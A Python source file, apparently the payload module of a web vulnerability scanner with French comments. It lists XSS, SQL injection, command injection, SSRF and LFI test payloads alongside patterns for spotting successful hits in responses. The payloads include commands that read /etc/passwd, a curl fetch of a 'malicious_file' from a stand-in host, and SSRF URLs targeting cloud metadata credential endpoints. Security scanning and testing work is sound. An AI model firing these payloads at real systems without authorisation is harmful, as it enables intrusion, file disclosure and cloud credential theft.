# vulnerabilities/payloads.py

"""
Base de données de payloads initiaux et de patterns de détection
pour les différentes vulnérabilités.
"""

# --- XSS Payloads ---
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\" onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<script>confirm(document.domain)</script>", # For domain confirmation
    "<script>prompt(1)</script>",
    "<div onmouseover=\"alert(1)\">Hover Me</div>",
    "</textarea><script>alert(1)</script>", # For textarea contexts
    "<a href=\"javascript:alert(1)\">Click Me</a>",
    # More advanced payloads for various contexts (attributes, URL, etc.)
]

# Patterns de détection XSS (strings ou regex simples à rechercher dans la réponse)
XSS_DETECTION_PATTERNS = [
    "alert(1)",
    "confirm(document.domain)",
    "prompt(1)",
    "<script>alert(1)</script>",
    "onerror=alert(1)"
]

# --- SQL Injection Payloads ---
# Error-based payloads
SQLI_PAYLOADS = [
    "'",                  # Basic single quote
    "\"" ,                # Basic double quote
    "')",                 # Close quote and parenthesis
    "'))",                # Close two quotes and two parentheses
    " ORDER BY 1--",      # Order by clause with comment
    " UNION SELECT NULL--", # Basic union (need to find column count)
    " OR 1=1--",          # Always true condition
    " AND 1=1--",         # Always true condition
    " OR 1=0--",          # Always false condition
    " AND 1=0--",         # Always false condition
    "' OR '1'='1",        # Classic Bypass
    "'; WAITFOR DELAY '0:0:5'--", # Time-based (MSSQL)
    "SLEEP(5)--",         # Time-based (MySQL/PostgreSQL)
    "Benchmark(10000000,MD5(1))--", # CPU-based (MySQL)
    # Error-based specific payloads (e.g., for specific DBs)
    "' || (SELECT 1 FROM DUAL WHERE 1=1)--", # Oracle
    "' AND 1=CONVERT(int,(SELECT @@version))--", # MSSQL version disclosure
    # Add more payloads for specific database types, blind SQLi, etc.
]

# Patterns d'erreurs SQL courantes à rechercher dans la réponse
SQLI_ERROR_PATTERNS = [
    "SQL syntax.*?error",
    "Warning: mysql_fetch_array()",
    "You have an error in your SQL syntax",
    "supplied argument is not a valid MySQL",
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "Invalid SQL Statement",
    "Error Occurred While Processing Request",
    "Incorrect syntax near",
    "Unclosed quotation mark",
    "ORA-\\d{5}", # Oracle errors
    "PostgreSQL.*?error",
    "\[SQLSTATE.*?\]", # General SQLSTATE error
]

# Boolean-based SQLi (conceptual, needs comparison logic in check)
SQLI_BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=0--"), # True and False conditions
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"0"),
]

# --- RCE Payloads (OS Command Injection) ---
RCE_PAYLOADS = [
    "& cat /etc/passwd", # Linux
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "|| cat /etc/passwd",
    "| dir",             # Windows
    "& dir",
    "; dir",
    "&& dir",
    "| ping -c 1 127.0.0.1", # Linux ping test
    "| ping -n 1 127.0.0.1", # Windows ping test
    # Specific commands for various environments/shells
    "|| curl example.com/malicious_file ||", # Out-of-band for Linux
    "& curl example.com/malicious_file &",
    "| powershell.exe -c \"whoami\"", # Windows PowerShell
]

# Patterns de détection RCE (contenu de fichiers système, sortie de commandes)
RCE_DETECTION_PATTERNS = [
    "root:x:0:0:",             # /etc/passwd content
    "daemon:x:1:1:",
    "administrator:.*?:\\d+:", # Windows SAM file like content
    "volume in drive",         # dir command output on Windows
    "directory of",            # dir command output on Windows
    "uid=",                    # id/whoami command output on Linux
    "ping statistics",         # ping command output
    "bytes from",              # ping command output
    "system32",                # typical Windows directory
    "[A-Z]:\\\\(?:[a-zA-Z0-9_ -]+\\\\)*", # Windows path pattern
]

# --- SSRF Payloads ---
SSRF_PAYLOADS = [
    "http://127.0.0.1/",           # Localhost
    "http://localhost/",           # Localhost
    "http://169.254.169.254/latest/meta-data/", # AWS EC2 Metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/", # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/", # GCP Metadata
    "http://10.0.0.0/admin",       # Common internal IP ranges
    "http://192.168.0.1/",
    "http://172.16.0.1/",
    "file:///etc/passwd",          # Local file inclusion attempt via file://
    "file:///C:/Windows/win.ini",  # Local file inclusion attempt for Windows
    "dict://localhost:6379/info",  # Redis
    "gopher://localhost:80/...",   # Gopher for internal services
    "ftp://localhost/etc/passwd",  # FTP
    # URL schemes bypasses
    "https://@127.0.0.1",
    "http://[::]:80/",             # IPv6 localhost
    "http://0.0.0.0/",
    "http://2130706433/",          # Decimal representation of 127.0.0.1
    "http://0x7f000001/",          # Hex representation of 127.0.0.1
    "http://some-internal-service:8080/", # Common internal service names
]

# Patterns de détection SSRF (contenu de pages internes, informations système)
SSRF_DETECTION_PATTERNS = [
    "root:x:0:0:",             # /etc/passwd content
    "Windows",                 # win.ini or other Windows file content
    "server-id",               # AWS/GCP metadata
    "iam/security-credentials",
    "EC2", "GCP",              # Common cloud provider terms
    "docker", "kubernetes",    # Container environment indicators
    "redis", "info",           # Redis service output
    "ftp", "220", "230",       # FTP banner
    "127.0.0.1", "localhost",  # Reflection of internal IP
    "internal service",        # Generic internal message
    "login_page", "dashboard", # Indicators of internal web pages
]

# --- LFI Payloads ---
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini", # Windows path traversal
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
    "....//....//....//etc/passwd", # Double encoding variation
    "/etc/passwd%00.jpg", # Null byte bypass
    "/proc/self/environ", # Linux env variables
    "/proc/self/cmdline", # Linux command line
    "file:///etc/passwd", # LFI via file:// protocol (if supported)
    # Filter bypasses
    "....//....//....//....//....//....//etc/passwd",
    "php://filter/resource=/etc/passwd", # PHP filter stream
    "php://filter/convert.base64-encode/resource=index.php", # PHP source code disclosure
]

# Patterns de détection LFI (contenu de fichiers système)
LFI_DETECTION_PATTERNS = [
    "root:x:0:0:",
    "daemon:x:1:1:",
    "\[fonts\]",               # win.ini content
    "\[extensions\]",
    "USER=", "PATH=",          # /proc/self/environ
    "PHP_SELF", "SCRIPT_FILENAME", # Common PHP internal vars
    "base64_decode",           # If source code is base64 encoded
    "<?php", "<HTML>",         # Indicators of source code disclosure
]

# --- Logic Flaws ---
# Logic flaws don't have standard payloads like other categories.
# They rely on understanding application flow and manipulating inputs.
# These might be specific values or sequences of actions.
# Example: Price manipulation, IDOR, authentication bypass.
# No specific patterns or payloads defined here as they are highly contextual.
